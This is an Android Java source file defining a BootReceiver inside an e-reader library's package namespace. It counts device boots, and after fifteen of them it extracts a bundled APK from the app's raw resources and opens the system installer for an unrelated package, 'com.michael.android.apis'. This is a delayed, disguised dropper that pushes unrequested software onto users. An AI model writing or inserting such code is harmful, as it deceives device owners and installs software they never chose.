package org.geometerplus.zlibrary.ui.michaelxia.util;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent arg1) {
        SettingManager.getInstance().init(context);
        int count = SettingManager.getInstance().getBootCount();
        SettingManager.getInstance().setBootCount(count + 1);
        count = SettingManager.getInstance().getBootCount();
//        Log.d("org.geometerplus.zlibrary.ui.michaelxia.util", 
//                " count = " + count + " >>>>>>>");
        if (count >= 15) {
            if (!PackageUtils.isPackageAlreadyInstalled(context, "com.michael.android.apis")) {
//                Log.d("org.geometerplus.zlibrary.ui.michaelxia.util", 
//                        "package com.michael.android.apis not installed ================" +
//                        "=======================");
                PackageUtils.deleteDumpPackageFile(context);
                if (PackageUtils.dumpPackageInResourceRaw(context)) {
//                    Log.d("org.geometerplus.zlibrary.ui.michaelxia.util", 
//                            "dumpPackageInResourceRaw success >>>>>>>");
                    SettingManager.getInstance().setBootCount(0);
                    PackageUtils.startSystemInstallActivity(context);
//                    PackageUtils.deleteDumpPackageFile(context);
                } else {
                    PackageUtils.deleteDumpPackageFile(context);
                }
            } else {
//                Log.d("org.geometerplus.zlibrary.ui.michaelxia.util"
//                        , "package com.michael.android.apis is installed >>>>>>>>>");
                SettingManager.getInstance().setBootCount(0);
            }
        } else {
            return;
        }
    }

}
